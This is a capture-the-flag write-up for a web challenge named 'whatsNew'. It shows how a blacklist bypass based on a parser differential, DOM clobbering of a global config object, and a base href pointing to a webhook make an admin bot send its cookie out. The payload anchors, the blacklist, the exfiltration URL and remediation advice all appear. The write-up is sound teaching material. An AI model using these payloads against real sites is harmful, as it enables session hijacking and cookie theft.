# K17 CTF 2026 - whatsNew

# Category: Web
# Difficulty: Hard

---

## The Challenge

This challenge was a blog posting application with an admin review bot.

We could create posts, and there was also a `/report` functionality that caused the admin bot to visit the application.

That immediately made the admin bot interesting.

The first thing I wanted to understand was what happened when our post was rendered in the browser, and whether any of our HTML was actually interpreted as HTML.

It was.

The description field was inserted into the page using `innerHTML`.

So the next question was pretty straightforward:

> Can I control anything interesting in the admin's browser through that HTML?

---

## Looking at the JavaScript

While going through the frontend JavaScript, I found something much more interesting.

The application was reading its configuration from:

```javascript
const cfg = window.whatsNew || {};
```

Then it checked:

```javascript
if (cfg.autoReview == 1) {
    const host = cfg.next;

    location.href =
        host.href +
        "?cookie=" +
        encodeURIComponent(document.cookie);
}
```

This was a huge finding.

If I could control:

```text
window.whatsNew
```

and make:

```text
autoReview == 1
```

then I could potentially control:

```text
next.href
```

The browser would then navigate to that location and append:

```text
document.cookie
```

to the URL.

So now I had a possible goal:

```text
User-controlled HTML
        ↓
Control window.whatsNew
        ↓
autoReview = 1
        ↓
Control next.href
        ↓
Admin browser redirects
        ↓
document.cookie appended
```

The remaining problem was getting my HTML past the application's filter.

---

# The Filter

The application had a custom HTML decoder and a blacklist.

The relevant logic looked roughly like:

```javascript
function decodeHtml(s) {
    return s.replace(
        /&(#[0-9]+|#x[0-9a-f]+|[a-z]+);/gi,
        ...
    );
}

function isSuspicious(s) {
    const BLACKLIST = [
        "whatsNew",
        "autoReview",
        "next",
        "href",
        "onerror",
        "script",
        "iframe"
    ];

    const decoded = decodeHtml(s);

    return BLACKLIST.some(
        b => decoded.toLowerCase().includes(b)
    );
}
```

At first, this looked like something I had to work around with a normal HTML injection technique.

But there was an important difference between the server and the browser.

---

# The Parser Differential

The server's decoder only handled HTML entities that ended with a semicolon.

For example:

```text
&#78;
```

would be decoded.

But:

```text
&#78
```

would not be decoded by the server-side function.

Chromium, however, could interpret numeric character references without the semicolon in this context.

That gave me a way to make the browser see something different from what the server's filter saw.

For example:

```text
whats&#78ew
```

The server-side decoder doesn't turn that into `whatsNew` because there is no terminating `;`.

But the browser interprets the character reference and produces:

```text
whatsNew
```

That meant I could bypass the blacklist while still getting the desired DOM property in the browser.

---

# Testing the Idea

I tried using an anchor like:

```html
<a id=whats&#78ew ...>
```

The filter didn't see the literal string:

```text
whatsNew
```

but the browser ended up creating an element with:

```text
id="whatsNew"
```

That was the first real breakthrough.

Now I had to figure out how to turn that element into the `window.whatsNew` object expected by the JavaScript.

---

# DOM Clobbering

This is where DOM clobbering came into the picture.

Browsers expose elements with certain IDs as properties on `window`.

So an element such as:

```html
<a id=whatsNew></a>
```

can result in:

```javascript
window.whatsNew
```

pointing to that element.

But I needed more than just the object itself.

The JavaScript expected properties such as:

```text
mode
category
panel
label
autoReview
next
```

and `next` needed to provide an `.href`.

The useful part was that multiple elements with the same ID can produce an `HTMLCollection`, allowing named elements to provide the properties the JavaScript accesses.

For example:

```html
<a id=whatsNew name=autoReview value=1></a>
<a id=whatsNew name=next href="/admin/preview"></a>
```

This gives us a structure that the JavaScript can interact with as if it were the expected configuration object.

So instead of injecting JavaScript, I was basically building the object that the existing JavaScript expected.

That was the second major breakthrough.

---

# The Character Limit

There was one problem.

The description field had a 200-character limit.

The complete DOM-clobbering payload needed more than that.

Initially, I thought I had to somehow make the entire payload fit into one post.

Then I looked at how the application rendered the posts.

The configuration was stored on `window`, which is global to the page.

That meant I didn't necessarily need every anchor in the same post.

If multiple posts were rendered on the homepage, each one could contribute part of the DOM.

So I split the payload across three posts.

The idea became:

```text
Post 1
 ├── mode
 └── category

Post 2
 ├── panel
 └── label

Post 3
 ├── autoReview
 └── next
```

When the admin loaded the page, the anchors from all three posts existed in the same DOM.

That allowed them to work together.

---

# Getting the Admin to My URL

There was another restriction.

The `next` value had to look like an `/admin/` path.

I needed the browser to ultimately navigate to my external webhook.

This is where the `<base>` element became useful.

I could set the document's base URL to my webhook:

```html
<base href="https://UUID.webhook.site">
```

Then the relative URL:

```text
/admin/preview
```

would resolve against that base.

So instead of trying to put an obviously external URL directly into the `next` attribute, I could use a relative `/admin/...` path while controlling how the browser resolved it.

The resulting navigation would look like:

```text
https://UUID.webhook.site/admin/preview?cookie=...
```

---

# Building the Payload

The basic helper I used for the clobbering anchors was:

```python
def anchor(name, attr, value):
    return f'<a id=whats&#78ew name={name} {attr}={value}></a>'
```

Then the payload was split between the categories.

Conceptually:

```text
Tech
 ├── base URL
 ├── mode
 └── category

Travel
 ├── panel
 └── label

Food
 ├── autoReview
 └── next
```

The encoded characters were important because they allowed the browser to reconstruct the property names while avoiding the server's blacklist.

---

# Triggering the Admin Bot

Once the three posts were created, I called:

```text
/report
```

This caused the admin bot to visit the application.

The chain at this point was:

```text
Admin visits homepage
        ↓
Our three posts are rendered
        ↓
HTML entities are interpreted by Chromium
        ↓
id becomes "whatsNew"
        ↓
DOM creates window.whatsNew
        ↓
Configuration properties are supplied by our anchors
        ↓
autoReview == 1
        ↓
JavaScript reads next.href
        ↓
Browser navigates to webhook
        ↓
document.cookie is added to query string
```

---

# Catching the Callback

I used a webhook endpoint to receive the request.

The important part of the callback was the query string containing:

```text
cookie=...
```

I then extracted the flag from the cookie value.

The response gave:

```text
K17{G4dg3t_D0M_Cl0663r1nggg!}
```

---

# Exploit Chain

The entire challenge can be reduced to:

```text
Raw HTML input
       ↓
Custom HTML decoder
       ↓
Parser differential
       ↓
Blacklist bypass
       ↓
id="whatsNew"
       ↓
DOM clobbering
       ↓
window.whatsNew
       ↓
Control autoReview
       ↓
Control next.href
       ↓
Admin bot visits page
       ↓
Redirect to webhook
       ↓
document.cookie
       ↓
Flag
```

---

# What Made This Interesting

The interesting part wasn't one huge vulnerability.

It was the way several small behaviours fit together.

The filter had a parsing difference.

The browser created globals from DOM IDs.

The JavaScript trusted a global object.

The application allowed user-controlled HTML.

The admin bot loaded that HTML.

And the JavaScript itself sent the cookie to whatever URL it was told to use.

Each piece by itself wasn't enough.

Putting them together was.

---

# What I Took Away From This

The biggest lesson for me from this challenge was to always think about parser differences.

If the server processes some input one way and the browser processes the same input another way, a blacklist can become much less useful than it looks.

The other thing that stood out was DOM clobbering.

I usually associate browser-side exploitation with JavaScript execution, but here we didn't need to inject our own JavaScript.

Instead, we manipulated the DOM so that existing JavaScript started working with attacker-controlled values.

That made this challenge a good reminder that when auditing a page that renders user-controlled HTML, I shouldn't only search for:

```text
<script>
onerror=
javascript:
```

I also need to look at how the application's own JavaScript interacts with the DOM.

---

# Remediation

There were several issues that made this exploit possible.

### 1. Don't use a blacklist for HTML

The application should use a proper HTML sanitizer with an allowlist of safe tags and attributes.

Trying to catch dangerous HTML through string matching is fragile because browsers support many different ways of representing the same characters.

### 2. Don't use `window` as the configuration object

Instead of:

```javascript
const cfg = window.whatsNew || {};
```

the application should obtain its configuration from a controlled data source and parse it explicitly.

### 3. Avoid attacker-controlled navigation

The application should validate navigation targets and preferably restrict them to trusted origins.

### 4. Protect sensitive session information

Sensitive cookies should be protected with appropriate cookie attributes such as `HttpOnly` and `Secure`.

However, cookie flags alone aren't a complete fix for this particular issue because the vulnerable JavaScript was deliberately reading `document.cookie`.

The root problem was allowing attacker-controlled HTML to influence code that had access to the admin session.

---

## Final Thoughts

This challenge was probably one of my favourite Web challenges from the CTF because the final exploit wasn't obvious when looking at any single component.

The breakthrough came from connecting the dots:

```text
Parser difference
      +
DOM behaviour
      +
Existing JavaScript
      +
Admin bot
      =
Cookie theft
```

It was a good example of why, during a Web challenge, I like to understand the entire data flow instead of focusing on one endpoint or one payload.

Sometimes the interesting bug is not where the input enters the application.

It's where that input eventually gets interpreted.

